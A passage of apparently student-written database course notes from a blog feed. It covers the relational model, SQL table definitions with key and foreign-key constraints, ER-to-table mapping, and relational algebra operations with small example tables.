<li>e.g. Students( <ins>sid</ins>: <code>string</code>, name: <code>string</code>, login: <code>string</code>, age: <code>integer</code>, gpa: <code>real</code> )<table>
<thead>
<tr>
<th align="center"><ins>sid</ins></th>
<th align="center">name</th>
<th align="center">login</th>
<th align="center">age</th>
<th align="center">gpa</th>
</tr>
</thead>
</table>
</li>
</ul>
</li>
</ul>
</li>
<li><p>Relation Instance</p>
<ul>
<li><p>a table with rows and columns </p>
<ul>
<li>e.g. <table>
<thead>
<tr>
<th align="center"><ins>sid</ins></th>
<th align="center">name</th>
<th align="center">login</th>
<th align="center">age</th>
<th align="center">gpa</th>
</tr>
</thead>
<tbody><tr>
<td align="center">50000</td>
<td align="center">Dave</td>
<td align="center">dave@cs</td>
<td align="center">19</td>
<td align="center">3.3</td>
</tr>
<tr>
<td align="center">53666</td>
<td align="center">Jones</td>
<td align="center">jones@cs</td>
<td align="center">18</td>
<td align="center">3.4</td>
</tr>
<tr>
<td align="center">53688</td>
<td align="center">Smith</td>
<td align="center">smith#@ee</td>
<td align="center">18</td>
<td align="center">3.2</td>
</tr>
<tr>
<td align="center">53650</td>
<td align="center">Smith</td>
<td align="center">smith@math</td>
<td align="center">19</td>
<td align="center">3.8</td>
</tr>
<tr>
<td align="center">53831</td>
<td align="center">Madayan</td>
<td align="center">madayan@music</td>
<td align="center">11</td>
<td align="center">1.8</td>
</tr>
<tr>
<td align="center">53832</td>
<td align="center">Guldu</td>
<td align="center">guldu@music</td>
<td align="center">20</td>
<td align="center">2.0</td>
</tr>
</tbody></table>
</li>
</ul>
</li>
<li><p>Reminder:</p>
<ol>
<li><font color="F54747">no two rows are identical</font></li>
<li>the order in the rows and fields are listed is not important</li>
</ol>
</li>
</ul>
</li>
<li><p>Definitions:</p>
<ol>
<li><font color="3A75EA">degree</font>: the number of fields</li>
<li><font color="3A75EA">cardinality</font>: the number of tuples (records)</li>
<li><font color="3A75EA">relational database</font>: a collection of relations with distinct relation names</li>
<li><font color="3A75EA">relational database schema</font>: the collection of schemas for the relations in the database</li>
<li><font color="3A75EA">instance</font> of relational database: a collection of relation instances</li>
</ol>
</li>
</ol>
<h3 id="Data-Definition-Language"><a href="#Data-Definition-Language" class="headerlink" title="Data Definition Language"></a>Data Definition Language</h3><ol>
<li><p>Create</p>
<ul>
<li>create the Student relation  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Create</span> <span class="keyword">table</span> Students(</span><br><span class="line">    sid    <span class="type">CHAR</span>(<span class="number">20</span>),</span><br><span class="line">    name   <span class="type">CHAR</span>(<span class="number">30</span>),</span><br><span class="line">    login  <span class="type">CHAR</span>(<span class="number">20</span>),</span><br><span class="line">    age    <span class="type">INTEGER</span>,</span><br><span class="line">    gpa    <span class="type">REAL</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>Insert</p>
<ul>
<li>insert a single tuple  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Insert</span></span><br><span class="line"><span class="keyword">into</span>        Students (sid, name, login, age, gpa)</span><br><span class="line"><span class="keyword">Values</span>      (<span class="number">53688</span>, <span class="string">&#x27;Smith&#x27;</span>, <span class="string">&#x27;smith@ee&#x27;</span>, <span class="number">18</span>, <span class="number">3.2</span>)</span><br></pre></td></tr></table></figure></li>
<li><font color="3A75EA">Noted</font>: it is not necessary to list out the name of fields, but make sure to <font color="F54747">match the order</font></li>
</ul>
</li>
<li><p>Delete</p>
<ul>
<li>delete tuples  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DELETE</span></span><br><span class="line"><span class="keyword">From</span>    Students S</span><br><span class="line"><span class="keyword">WHERE</span>   S.name <span class="operator">=</span> <span class="string">&#x27;Smith&#x27;</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>Update</p>
<ul>
<li>modify the column values in an existing row  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span>  Students S</span><br><span class="line"><span class="keyword">SET</span>     S.age <span class="operator">=</span> S.age <span class="operator">+</span> <span class="number">1</span>, S.gpa <span class="operator">=</span> S.gpa <span class="operator">-</span> <span class="number">1</span></span><br><span class="line"><span class="keyword">WHERE</span>   S.sid <span class="operator">=</span> <span class="number">53688</span></span><br></pre></td></tr></table></figure></li>
<li><font color="3A75EA">Noted</font>: it would identify all satisfied records then update them</li>
<li>e.g.  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span>  Students S</span><br><span class="line"><span class="keyword">SET</span>     S.gpa <span class="operator">=</span> S.gpa <span class="operator">-</span> <span class="number">0.1</span></span><br><span class="line"><span class="keyword">WHERE</span>   S.gpa <span class="operator">&gt;=</span> <span class="number">3.3</span></span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th align="center"><ins>sid</ins></th>
<th align="center">name</th>
<th align="center">login</th>
<th align="center">age</th>
<th align="center">gpa</th>
</tr>
</thead>
<tbody><tr>
<td align="center">50000</td>
<td align="center">Dave</td>
<td align="center">dave@cs</td>
<td align="center">19</td>
<td align="center"><font color="F54747">3.2</font></td>
</tr>
<tr>
<td align="center">53666</td>
<td align="center">Jones</td>
<td align="center">jones@cs</td>
<td align="center">18</td>
<td align="center"><font color="F54747">3.3</font></td>
</tr>
<tr>
<td align="center">53688</td>
<td align="center">Smith</td>
<td align="center">smith#@ee</td>
<td align="center">18</td>
<td align="center">3.2</td>
</tr>
<tr>
<td align="center">53650</td>
<td align="center">Smith</td>
<td align="center">smith@math</td>
<td align="center">19</td>
<td align="center"><font color="F54747">3.7</font></td>
</tr>
<tr>
<td align="center">53831</td>
<td align="center">Madayan</td>
<td align="center">madayan@music</td>
<td align="center">11</td>
<td align="center">1.8</td>
</tr>
<tr>
<td align="center">53832</td>
<td align="center">Guldu</td>
<td align="center">guldu@music</td>
<td align="center">20</td>
<td align="center">2.0</td>
</tr>
</tbody></table>
</li>
</ul>
</li>
</ol>
<h3 id="Key-Constraint"><a href="#Key-Constraint" class="headerlink" title="Key Constraint"></a>Key Constraint</h3><ul>
<li>certain minimal subset of the fields, which is a <font color="F54747">unique identifier</font> for a tuple, declare by <code>UNIQUE</code> command</li>
<li>designer can also identify a <font color="F54747">primary key</font> by <code>PRIMARY KEY</code>  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Create</span> <span class="keyword">table</span> Students(</span><br><span class="line">    sid    <span class="type">CHAR</span>(<span class="number">20</span>),</span><br><span class="line">    name   <span class="type">CHAR</span>(<span class="number">30</span>),</span><br><span class="line">    login  <span class="type">CHAR</span>(<span class="number">20</span>),</span><br><span class="line">    age    <span class="type">INTEGER</span>,</span><br><span class="line">    gpa    <span class="type">REAL</span>,</span><br><span class="line">    <span class="keyword">UNIQUE</span>(name, age),     <span class="comment">-- a key: not allow two records have the same name and age</span></span><br><span class="line">    <span class="keyword">CONSTRAINT</span> StudentsKey <span class="keyword">PRIMARY</span> KEY (sid)    <span class="comment">-- a primary key</span></span><br><span class="line">)   <span class="comment">-- the constraint name StudentsKey is not necessary to be set</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="Foreign-Key"><a href="#Foreign-Key" class="headerlink" title="Foreign Key"></a>Foreign Key</h3><ul>
<li>a set of fields in one relation r that is used to <font color="F54747">refer</font> to a tuple in another relation s<ul>
<li><p>e.g.</p>
<table>
<thead>
<tr>
<th align="center"><ins>cid</ins></th>
<th align="center">grade</th>
<th align="center">sid</th>
</tr>
</thead>
<tbody><tr>
<td align="center">CSC101</td>
<td align="center">D</td>
<td align="center">53831</td>
</tr>
<tr>
<td align="center">ERG202</td>
<td align="center">B</td>
<td align="center">53832</td>
</tr>
<tr>
<td align="center">IEE321</td>
<td align="center">A</td>
<td align="center">53650</td>
</tr>
<tr>
<td align="center">PSY203</td>
<td align="center">B</td>
<td align="center">53666</td>
</tr>
</tbody></table>
</li>
<li><p>In this case, <font color="3A75EA">sid</font> would be the <font color="3A75EA">foreign key</font></p>
  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> Enrolled&#123;</span><br><span class="line">    sid     <span class="type">CHAR</span>(<span class="number">20</span>),</span><br><span class="line">    cid     <span class="type">CHAR</span>(<span class="number">20</span>),</span><br><span class="line">    grade   <span class="type">CHAR</span>(<span class="number">10</span>),</span><br><span class="line">    <span class="keyword">PRIMARY</span> KEY (sid, cid),</span><br><span class="line">    <span class="keyword">FOREIGN</span> KEY (sid) <span class="keyword">REFERENCES</span> Students</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>Noted:</p>
<ol>
<li>Cannot insert <code>&lt;55555, ART104, A&gt;</code> because there is no tuple in <code>Students</code> with <code>sid = 55555</code>.</li>
<li>Cannot delete <code>&lt;53666, Jones, ...&gt;</code> because there is a tuple from <code>Enrolled</code> with <code>sid = 53666</code>.</li>
</ol>
</li>
</ul>
</li>
</ul>
<h3 id="Foreign-key-violations"><a href="#Foreign-key-violations" class="headerlink" title="Foreign key violations"></a>Foreign key violations</h3><ol>
<li><p>Insert:</p>
<ul>
<li>insert a row to <code>Enrolled</code> with a sid value that does not appear in <code>Students</code></li>
<li>The <code>INSERT</code> is <font color="F54747">reject</font></li>
</ul>
</li>
<li><p>Delete &amp; Update:</p>
<ul>
<li>Delete or update a <code>Students</code> row, the row in <code>Enrolled</code> refer to the target can have following operations:<ol>
<li>Delete <font color="F54747">all rows</font> in <code>Enrolled</code> that refer to the delete <code>Students</code> row</li>
<li>Disallow the deletion</li>
<li>Set the sid column in <code>Enrolled</code> row that refers to it to <code>default</code></li>
<li>Set the sid column in <code>Enrolled</code> row that refers to it to <code>null</code></li>
</ol>
</li>
</ul>
</li>
</ol>
<ul>
<li><p>Operations:</p>
<ol>
<li><p><code>NO ACTION</code> (default)</p>
<ul>
<li>The action (<code>DELETE</code> or <code>UPDATE</code>) is to be rejected</li>
</ul>
</li>
<li><p><code>CASCADE</code></p>
<ul>
<li>If <code>Students</code> row is deleted, all <code>Enrolled</code> rows that refer to it are deleted</li>
</ul>
</li>
<li><p><code>SET DEFAULT</code></p>
<ul>
<li>Switch the <code>Enrolled</code> row to a <code>DEFAULT</code> student</li>
</ul>
</li>
<li><p><code>SET NULL</code></p>
<ul>
<li>Allow the use of <code>NULL</code> as the <code>DEFAULT</code> value</li>
</ul>
</li>
</ol>
  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> Enrolled&#123;</span><br><span class="line">    sid     <span class="type">CHAR</span>(<span class="number">20</span>),</span><br><span class="line">    cid     <span class="type">CHAR</span>(<span class="number">20</span>),</span><br><span class="line">    grade   <span class="type">CHAR</span>(<span class="number">10</span>),</span><br><span class="line">    <span class="keyword">PRIMARY</span> KEY (sid, cid),</span><br><span class="line">    <span class="keyword">FOREIGN</span> KEY (sid) <span class="keyword">REFERENCES</span> Students</span><br><span class="line">                        <span class="keyword">ON</span> <span class="keyword">DELETE</span> CASCADE</span><br><span class="line">                        <span class="keyword">ON</span> <span class="keyword">UPDATE</span> <span class="keyword">NO</span> ACTION</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="Logical-Database-Design"><a href="#Logical-Database-Design" class="headerlink" title="Logical Database Design"></a>Logical Database Design</h2><h3 id="Entity-Sets"><a href="#Entity-Sets" class="headerlink" title="Entity Sets"></a>Entity Sets</h3><img src="https://p.ipic.vip/fd10un.png" width="250px"/>

<ol>
<li><p>Attributes:</p>
<ul>
<li>all attributes of that entity</li>
</ul>
</li>
<li><p>Keys:</p>
<ul>
<li>the primary key and condidate keys (if exist)</li>
</ul>
</li>
<li><p>Entity Set:</p>
<ul>
<li><strong>Employees</strong>: <ins>id</ins>, name, lot</li>
</ul>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> Employees(</span><br><span class="line">    id      <span class="type">CHAR</span>(<span class="number">11</span>),</span><br><span class="line">    name    <span class="type">CHAR</span>(<span class="number">30</span>),</span><br><span class="line">    lot     <span class="type">INTEGER</span>,</span><br><span class="line">    <span class="keyword">PRIMARY</span> KEY(id)     <span class="comment">-- primary key &#123;id&#125;</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="Relationship-Sets"><a href="#Relationship-Sets" class="headerlink" title="Relationship Sets"></a>Relationship Sets</h3><img src="https://p.ipic.vip/49vkub.png" width="400px" />

<ol>
<li><p>Attributes:</p>
<ul>
<li>the primary key attributes of each participating entity set</li>
<li>its own attribute</li>
<li>the descriptive attribute</li>
</ul>
</li>
<li><p>Keys:</p>
<ul>
<li><font color="F54747">primary key</font>: the group of primary keys of each participating entity</li>
<li>the foreign keys</li>
</ul>
</li>
<li><p>Entity Table:</p>
<ul>
<li><strong>Employees</strong>: <ins>id</ins>, name, lot</li>
<li><strong>Departments</strong>: <ins>did</ins>, dname, budget</li>
<li><strong>Locations</strong>: <ins>address</ins>, capacity</li>
</ul>
</li>
<li><p>Relationship Table:</p>
<ul>
<li><strong>Work_In2</strong>: id, did, address, since (<font color="F54747">primary key</font>: <code>&#123;id, did, address&#125;</code>)</li>
</ul>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> Work_In2(</span><br><span class="line">    <span class="comment">-- primary key of each participating entity set</span></span><br><span class="line">    id      <span class="type">CHAR</span>(<span class="number">11</span>),</span><br><span class="line">    did     <span class="type">INTEGER</span>,</span><br><span class="line">    address <span class="type">CHAR</span>(<span class="number">20</span>),</span><br><span class="line">    <span class="comment">-- its own attribute</span></span><br><span class="line">    since   <span class="type">DATE</span>,</span><br><span class="line">    <span class="comment">-- primary key (cannot be null)</span></span><br><span class="line">    <span class="keyword">PRIMARY</span> KEY (id, did, address),  <span class="comment">-- the group of primary keys of each entity</span></span><br><span class="line">    <span class="comment">-- foreign keys</span></span><br><span class="line">    <span class="keyword">FOREIGN</span> KEY (id) <span class="keyword">REFERENCES</span> Employees,</span><br><span class="line">    <span class="keyword">FOREIGN</span> KEY (did) <span class="keyword">REFERENCES</span> Departments,</span><br><span class="line">    <span class="keyword">FOREIGN</span> KEY (address) <span class="keyword">REFERENCES</span> Locations</span><br><span class="line">)</span><br></pre></td></tr></table></figure></li>
</ol>
<ul>
<li><p>demonstrating on descriptive attributes</p>
  <img src="https://p.ipic.vip/yhhwjs.png" width="250px" /></li>
</ul>
<ol start="3">
<li><p>Entity Table:</p>
<ul>
<li><strong>Employees</strong>: <ins>id</ins>, name, lot</li>
</ul>
</li>
<li><p>Relationship Table:</p>
<ul>
<li><strong>Reoports_To</strong>: supervisor_id, subordinate_id (<font color="F54747">primary key</font>: <code>&#123;supervisor_id, subordinate_id&#125;</code>)</li>
</ul>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> Reoports_To(</span><br><span class="line">    <span class="comment">-- the descriptive attributes</span></span><br><span class="line">    supervisor_id   <span class="type">CHAR</span>(<span class="number">11</span>),</span><br><span class="line">    subordinate_id  <span class="type">CHAR</span>(<span class="number">11</span>),</span><br><span class="line">    <span class="comment">-- primary key</span></span><br><span class="line">    <span class="keyword">PRIMARY</span> KEY (supervisor_id, subordinate_id),    <span class="comment">-- the group of attributes</span></span><br><span class="line">    <span class="comment">-- foreign keys (relate the descriptive attributes to the associated attribute)</span></span><br><span class="line">    <span class="keyword">FOREIGN</span> KEY (supervisor_id) <span class="keyword">REFERENCES</span> Employees(id),</span><br><span class="line">    <span class="keyword">FOREIGN</span> KEY (subordinate_id) <span class="keyword">REFERENCES</span> Employees(id),</span><br><span class="line">)</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="Relationship-Sets-Key-Constraints"><a href="#Relationship-Sets-Key-Constraints" class="headerlink" title="Relationship Sets (Key Constraints)"></a>Relationship Sets (<font color="3A75EA">Key Constraints</font>)</h3><img src="https://p.ipic.vip/h6bfwe.png" width="400px" />

<ul>
<li>each department has <font color="3A75EA">at most one</font> manager (i.e., no two tuples can have same <code>did</code> but can have same <code>id</code> in <code>Managers</code> table)</li>
<li><code>did</code> is the primary &#x2F; candidate key but <code>&#123;id, did&#125;</code> is not as it is not minimal</li>
</ul>
<ol>
<li><p>Attributes:</p>
<ul>
<li>all attributes of the entity set with the candidate key</li>
<li>the primary key attributes of each participating entity set</li>
<li>its own attributes</li>
</ul>
</li>
<li><p>Keys:</p>
<ul>
<li><font color="F54747">primary key</font>: the only required primary key</li>
<li>the foreign keys</li>
</ul>
</li>
<li><p>Entity Table:</p>
<ul>
<li><strong>Employees</strong>: <ins>id</ins>, name, lot</li>
<li><strong>Departments</strong>: <ins>did</ins>, dname, budget</li>
</ul>
</li>
<li><p>Relationship Table:</p>
<ul>
<li><strong>Managers</strong>: <ins>did</ins>, dname, budget, id, since (<font color="F54747">primary key</font>: <code>&#123;did&#125;</code>)</li>
</ul>
</li>
</ol>
<ul>
<li><p>Cons: if a lot of departments have no manager, it is wasting space</p>
  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> Managers(</span><br><span class="line">    <span class="comment">-- all attributes of the entity set with the candidate key</span></span><br><span class="line">    did     <span class="type">INTEGER</span>,</span><br><span class="line">    dname   <span class="type">CHAR</span>(<span class="number">20</span>),</span><br><span class="line">    budget  <span class="type">REAL</span>,</span><br><span class="line">    <span class="comment">-- primary key of each entity set</span></span><br><span class="line">    id      <span class="type">CHAR</span>(<span class="number">11</span>),</span><br><span class="line">    <span class="comment">-- its own attributes</span></span><br><span class="line">    since   <span class="type">DATE</span>,</span><br><span class="line">    <span class="comment">-- primary key (not the set of primary keys in entity sets)</span></span><br><span class="line">    <span class="keyword">PRIMARY</span> KEY (did),</span><br><span class="line">    <span class="keyword">FOREIGN</span> KEY (id) <span class="keyword">REFERENCES</span> Employees</span><br><span class="line">)</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="Relationship-Sets-Participation-Constraints"><a href="#Relationship-Sets-Participation-Constraints" class="headerlink" title="Relationship Sets (Participation Constraints)"></a>Relationship Sets (<font color="3A75EA">Participation Constraints</font>)</h3><img src="https://p.ipic.vip/kay8v8.png" width="400px" />

<ul>
<li><p>each department has <font color="3A75EA">exactly one one</font> manager (i.e., <code>id</code> cannot set to be <code>DELETE</code>)</p>
  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> Managers(</span><br><span class="line">    did     <span class="type">INTEGER</span>,</span><br><span class="line">    dname   <span class="type">CHAR</span>(<span class="number">20</span>),</span><br><span class="line">    budget  <span class="type">REAL</span>,</span><br><span class="line">    id      <span class="type">CHAR</span>(<span class="number">11</span>),</span><br><span class="line">    since   <span class="type">DATE</span>,</span><br><span class="line">    <span class="keyword">PRIMARY</span> KEY (did),</span><br><span class="line">    <span class="comment">-- must have one manager (turn on cannot DELETE)</span></span><br><span class="line">    <span class="keyword">FOREIGN</span> KEY (id) <span class="keyword">REFERENCES</span> Employees <span class="keyword">ON</span> <span class="keyword">DELETE</span> <span class="keyword">NO</span> ACTION     </span><br><span class="line">)</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="Week-Entity-Sets"><a href="#Week-Entity-Sets" class="headerlink" title="Week Entity Sets"></a>Week Entity Sets</h3><img src="https://p.ipic.vip/sr2epq.png" width="400px" />

<ul>
<li><p>The weak entity set always</p>
<ul>
<li>participates in a one-to-many binary relationship</li>
<li>has a key constraint</li>
<li>has total participation</li>
</ul>
</li>
<li><p>Primary key: <code>&#123;id, pname&#125;</code> as <code>Dependents</code> is a weak entity</p>
</li>
</ul>
<ol>
<li><p>Attributes:</p>
<ul>
<li>all attributes of the entity set with the candidate key</li>
<li>the primary key attributes of each participating entity set</li>
<li>its own attributes</li>
</ul>
</li>
<li><p>Keys:</p>
<ul>
<li><font color="F54747">primary key</font>: the group of primary key in participating entity</li>
<li>the foreign keys</li>
</ul>
</li>
<li><p>Entity Table:</p>
<ul>
<li><strong>Employees</strong>: <ins>id</ins>, name, lot</li>
<li><strong>Departments</strong>: <ins>did</ins>, dname, budget</li>
</ul>
</li>
<li><p>Relationship Table:</p>
<ul>
<li><strong>Managers</strong>: did, dname, budget, id, since (<font color="F54747">primary key</font>: <code>&#123;id, pname&#125;</code>)</li>
</ul>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> Policy(</span><br><span class="line">    <span class="comment">-- all attributes of the entity set</span></span><br><span class="line">    pname   <span class="type">CHAR</span>(<span class="number">20</span>),</span><br><span class="line">    age     <span class="type">INTEGER</span>,</span><br><span class="line">    <span class="comment">-- the primary key of each participating entity</span></span><br><span class="line">    id      <span class="type">CHAR</span>(<span class="number">11</span>),</span><br><span class="line">    <span class="comment">-- its own attributes</span></span><br><span class="line">    cost    <span class="type">REAL</span>,</span><br><span class="line">    <span class="comment">-- primary key</span></span><br><span class="line">    <span class="keyword">PRIMARY</span> KEY (pname,id),</span><br><span class="line">    <span class="comment">-- ensure that information about employee&#x27;s policy and dependents is deleted</span></span><br><span class="line">    <span class="keyword">FOREIGN</span> KEY (id) <span class="keyword">REFERENCES</span> Employees <span class="keyword">ON</span> <span class="keyword">DELETE</span> CASCADE</span><br><span class="line">)</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="Class-Hierarchies"><a href="#Class-Hierarchies" class="headerlink" title="Class Hierarchies"></a>Class Hierarchies</h3><img src="https://p.ipic.vip/d3y6w4.png" width="450px" />

<ol>
<li>Entity Table:<ul>
<li><strong>Employees</strong>: <ins>id</ins>, name, lot</li>
<li><strong>Hourly-Emps</strong>: <ins>id</ins>, hour_worked, hour_wages</li>
<li><strong>Contract-Emps</strong>: <ins>id</ins>, contract_id</li>
</ul>
</li>
</ol>
<h3 id="Aggregation"><a href="#Aggregation" class="headerlink" title="Aggregation"></a>Aggregation</h3><img src="https://p.ipic.vip/hz86ip.png" width="500px" />

<ol>
<li><p>Entity Table:</p>
<ul>
<li><strong>Employees</strong>: <ins>id</ins>, name, lot</li>
<li><strong>Departments</strong>: <ins>did</ins>, dname, budget</li>
<li><strong>Projects</strong>: <ins>pid</ins>, started-on, pbudget</li>
</ul>
</li>
<li><p>Relationship Table:</p>
<ul>
<li><strong>Monitors</strong>: id, pid, did, until (<font color="F54747">primary key</font>: <code>&#123;id, pid, did&#125;</code>)</li>
<li><strong>Sponsors</strong>: pid, did, since (<font color="F54747">primary key</font>: <code>&#123;pid, did&#125;</code>)</li>
</ul>
</li>
</ol>
<!-- 
<font color="3A75EA">Blue</font>
<font color="F54747">Red</font>
-->]]></content>
      <categories>
        <category>CSCI3170</category>
      </categories>
      <tags>
        <tag>database</tag>
      </tags>
  </entry>
  <entry>
    <title>Relational Algebra</title>
    <url>/myBlog/2023/02/16/2023/CSCI3170/2023-2-16-CSCI3170-RelationalAlgebra/</url>
    <content><![CDATA[<h2 id="Basic-Operations"><a href="#Basic-Operations" class="headerlink" title="Basic Operations"></a>Basic Operations</h2><h3 id="Select-sigma"><a href="#Select-sigma" class="headerlink" title="Select $\sigma$"></a>Select <font size="3px">$\sigma$</font></h3><ul>
<li><p>specifies the tuples to retain through a <font color="3A75EA">selection condition</font> which is a Boolean combination</p>
<p>  $$\sigma_{conditions}(R)$$</p>
  <img src="https://p.ipic.vip/rgtu0c.png" width="400px" /></li>
</ul>
<h3 id="Project-Pi"><a href="#Project-Pi" class="headerlink" title="Project $\Pi$"></a>Project <font size="3px">$\Pi$</font></h3><ul>
<li><p><font color="3A75EA"><strong>Return</strong></font>: extract columns from a relation by specifying the field to be retained</p>
</li>
<li><p>the duplicated row will be <font color="F54747">eliminated</font></p>
<p>  $$\Pi_{fields}(R)$$</p>
  <img src="https://p.ipic.vip/rzij6p.png" width="400px" /></li>
</ul>
<h3 id="Rename-rho"><a href="#Rename-rho" class="headerlink" title="Rename $\rho$"></a>Rename <font size="3px">$\rho$</font></h3><p>$$\rho \space(R(F), \space E)$$ </p>
<ul>
<li><p><font color="3A75EA"><strong>Return</strong></font>: a relation named R</p>
</li>
<li><p>E: relation algebra expression</p>
</li>
<li><p>F: renaming list</p>
<ul>
<li>oldname → newname<ul>
<li>$ \rho \space ( \space C ( sid → identity, \space child → dependent ), \space E )$</li>
</ul>
</li>
<li>position → newname<ul>
<li>$ \rho \space ( \space C ( 3 → identity), \space E )$</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="Sets-Operations"><a href="#Sets-Operations" class="headerlink" title="Sets Operations"></a>Sets Operations</h2><h3 id="Union-R-cup-S"><a href="#Union-R-cup-S" class="headerlink" title="Union $R \cup S$"></a>Union <font size="3px">$R \cup S$</font></h3><ul>
<li><p><font color="3A75EA"><strong>Return</strong></font>: a relation instance containing all tuples that <font color="3A75EA">occurs in either relation instance R or S</font></p>
</li>
<li><p>the duplicated row will be <font color="F54747">eliminated</font></p>
</li>
<li><p>Two relation instances must be <font color="3A75EA">union-compatible</font></p>
<ul>
<li>They have <font color="F54747">same number of fields</font></li>
<li>The corresponding fields have the <font color="F54747">same domains</font></li>
</ul>
<p>  $$R \cup S &#x3D; S \cup R$$</p>
  <img src="https://p.ipic.vip/kf2cz3.png" width="400px" /></li>
</ul>
<h3 id="Set-Different-R-S"><a href="#Set-Different-R-S" class="headerlink" title="Set Different $R - S$"></a>Set Different <font size="3px">$R - S$</font></h3><ul>
<li><p><font color="3A75EA"><strong>Return</strong></font>: a relation instance containing all the tuples that <font color="3A75EA">occurs in R but not in S</font></p>
</li>
<li><p>Two relation instances must be <font color="3A75EA">union-compatible</font></p>
<p>  $$R - S \ne S - R$$</p>
  <img src="https://p.ipic.vip/osr1ew.png" width="400px" /></li>
</ul>
<h3 id="Set-Intersection-R-cap-S"><a href="#Set-Intersection-R-cap-S" class="headerlink" title="Set Intersection $R \cap S$"></a>Set Intersection <font size="3px">$R \cap S$</font></h3><ul>
<li><p><font color="3A75EA"><strong>Return</strong></font>: a relation instance containing all tuples that <font color="3A75EA">occurs in both R and S</font></p>
</li>
<li><p>Two relation instances must be <font color="3A75EA">union-compatible</font></p>
<p>  $$R \cap S &#x3D; R - (R - S) &#x3D; S - (S - R)$$</p>
  <img src="https://p.ipic.vip/03sbta.png" width="400px" /></li>
</ul>
<h2 id="Corss-amp-Join"><a href="#Corss-amp-Join" class="headerlink" title="Corss &amp; Join"></a>Corss &amp; Join</h2><h3 id="Cartesian-Product"><a href="#Cartesian-Product" class="headerlink" title="Cartesian Product"></a>Cartesian Product</h3><ul>
<li><p><font color="3A75EA"><strong>Return</strong></font>: a relation instance whose schema contains all the fields of R followed by all the fields of S<br>  $$R \times S \space &#x3D; \space \langle r, s \rangle, \space \space \space r \in R, s \in S$$</p>
  <img src="https://p.ipic.vip/27lxln.png" width="400px" />
</li>
<li><p>Situation: Comparation in different entity seys</p>
<ol>
<li><p>Select the female employees and project the <code>f_name</code>, <code>l_name</code> and <code>id</code> to Empnames<br> $$ \rho \space ( \space Empnames,\space \Pi_{fname, \space lname, \space id} \space ( \space \sigma_{sex&#x3D;’F’} \space ( Employee ) ) )$$</p>
 <img src="https://p.ipic.vip/sczbps.png" width="400px" />
</li>
<li><p>FemaleEmps cross Empnames, such that they are able to compare in a table (entity)<br> $$ \rho \space ( \space EmpDependents, FemaleEmps \times Empnames )$$</p>
 <img src="https://p.ipic.vip/4hzl7b.png" width="400px" />
</li>
<li><p>Choose the row that has the same id and did and project the <code>f_name</code>, <code>l_name</code> and <code>dep_name</code> onto Results<br> $$\rho \space ( \space Results, \space \Pi_{fname, \space lname, \space depname} \space ( \space \sigma_{id &#x3D; did} \space ( EmpDependents ) ) )$$</p>
 <img src="https://p.ipic.vip/mtxewc.png" width="200px" /></li>
</ol>
</li>
</ul>
<h3 id="Condition-Join-Join"><a href="#Condition-Join-Join" class="headerlink" title="Condition Join $\Join$"></a>Condition Join $\Join$</h3><ul>
<li><p>Cartesian product with selection<br>$$ R \Join_{c} S &#x3D; \sigma_{c} \space ( R \times S) $$</p>
  <img src="https://p.ipic.vip/rv7eax.png" width="500px" />
</li>
<li><p>Situation: Find maximum</p>
<ol>
<li><p>Select the employees whose salary is not the greatest<br> $$ \rho \space (R, \space \Pi_{E.name} \space ( E \space \Join_{E.salary \space &lt; \space F.salary} \space \rho (F, E)))$$</p>
 <img src="https://p.ipic.vip/cs5znb.png" width="400px" />
</li>
<li><p>Different (Remove the selected employee)<br> $$ \rho \space (Result, \Pi_{name} \space (E) - R) $$</p>
 <img src="https://p.ipic.vip/hooft9.png" width="300px" /></li>
</ol>
</li>
</ul>
<h3 id="Equi-Join"><a href="#Equi-Join" class="headerlink" title="Equi Join"></a>Equi Join</h3><ul>
<li>the join condition consists solely of equalities<br>$$ R \Join_{R.b \space &#x3D; \space S.b} S$$  <img src="https://p.ipic.vip/a5t0yl.png" width="400px" /></li>
</ul>
<h3 id="Natural-Join"><a href="#Natural-Join" class="headerlink" title="Natural Join"></a>Natural Join</h3><ul>
<li>An equi join in which equalities are specified on all fields having the same names in R and S<br>$$ R \Join S &#x3D; R \Join_{R.b \space &#x3D; \space S.b \space \land \space R.d \space &#x3D; \space S.d } S $$  <img src="https://p.ipic.vip/h49ps8.png" width="400px" /></li>
</ul>
<h2 id="Division"><a href="#Division" class="headerlink" title="Division"></a>Division</h2><ul>
<li>The division operation is useful for expressing certain kinds of queries</li>
<li>Example: find the names of sailors who have reserved all boats</li>
</ul>
<!-- 
<img src="" width="500px" />
